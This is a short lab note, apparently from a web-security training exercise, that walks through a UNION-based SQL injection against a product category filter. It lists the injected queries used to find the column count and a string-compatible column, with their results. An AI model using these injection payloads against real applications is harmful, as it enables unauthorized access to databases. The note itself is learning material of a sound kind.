SQLI - Product Category Filter

First step: determine the number of columns.

Second step: Identify the a column that is compatiable with string type.

It will provide me a random value `BBBFF9` that I wanna make it appear in the query result.

Goal: SQL Injection Union-Based Attack that returns an additional row contains the `random value` provided above.

Process:
# GET THE NUMBER OF COLS
SELECT ? FROM products WHERE category = 'Gifts';
SELECT ? FROM products WHERE category = 'Gifts' UNION SELECT NULL--'; -> error
SELECT ? FROM products WHERE category = 'Gifts' UNION SELECT NULL,NULL--'; -> error
SELECT ? FROM products WHERE category = 'Gifts' UNION SELECT NULL,NULL,NULL--'; -> (n of columns is 3)

# GET THE COL THAT IS compatiable WITH STRING TYPE.
SELECT ? FROM products WHERE category = 'Gifts' UNION SELECT 'something',NULL,NULL--'; -> error
SELECT ? FROM products WHERE category = 'Gifts' UNION SELECT NULL,'BBBFF9',NULL--'; -> passed!
SELECT ? FROM products WHERE category = 'Gifts' UNION SELECT NULL,NULL,'something'--'; -> error


THEY ARE 3 COLS IN THE TABLE products.
THE SECOND COLUMN IS THE STRING compatiable TYPE BUT IT DOESN'T SUPPORT ""
